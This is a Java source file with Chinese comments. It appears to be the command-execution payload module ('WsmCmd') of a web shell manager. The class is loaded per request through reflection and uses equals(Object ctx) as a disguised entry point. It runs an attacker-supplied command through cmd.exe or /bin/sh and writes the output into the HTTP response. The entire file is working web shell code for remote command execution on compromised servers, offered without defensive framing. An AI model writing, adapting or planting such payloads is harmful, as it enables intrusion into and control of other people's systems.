// 命令执行载荷：redirectErrorStream 合并 stderr（防管道满死锁），读完再 waitFor。
// 约束同 WsmProbe：默认包、全反射、单 class、占位值唯一、零跨类引用（每请求独立
// ClassLoader 实例定义，其他载荷类不可见——助手方法各自内联）。
public class WsmCmd {

	public static final String c = "WSMC-C0"; // 命令
	public static final String d = "WSMC-D0"; // 工作目录（空 = 不指定）

	public boolean equals(Object ctx) {
		try {
			String os = System.getProperty("os.name", "").toLowerCase();
			boolean win = os.contains("win");
			ProcessBuilder pb = new ProcessBuilder(win ? "cmd.exe" : "/bin/sh", win ? "/c" : "-c", c);
			if (d != null && d.length() > 0) {
				pb.directory(new java.io.File(d));
			}
			pb.redirectErrorStream(true);
			Process p = pb.start();
			java.io.ByteArrayOutputStream bo = new java.io.ByteArrayOutputStream();
			byte[] buf = new byte[8192];
			int n;
			java.io.InputStream in = p.getInputStream();
			while ((n = in.read(buf)) != -1) bo.write(buf, 0, n);
			p.waitFor();
			write(respOf(ctx), new String(bo.toByteArray(), "UTF-8"));
		} catch (Throwable e) {
			try { write(respOf(ctx), "!ERR " + e); } catch (Throwable ignored) {}
		}
		return true;
	}

	static Object respOf(Object ctx) {
		if (ctx == null) return null;
		if (ctx instanceof Object[]) {
			Object[] a = (Object[]) ctx;
			return a.length > 1 ? a[1] : null;
		}
		try { return ctx.getClass().getMethod("getResponse").invoke(ctx); } catch (Throwable ignored) {}
		return null;
	}

	static void write(Object resp, String s) throws Exception {
		try {
			resp.getClass().getMethod("setContentType", String.class).invoke(resp, "text/plain;charset=UTF-8");
		} catch (Throwable ignored) {}
		Object w = resp.getClass().getMethod("getWriter").invoke(resp);
		w.getClass().getMethod("write", String.class).invoke(w, s);
	}
}
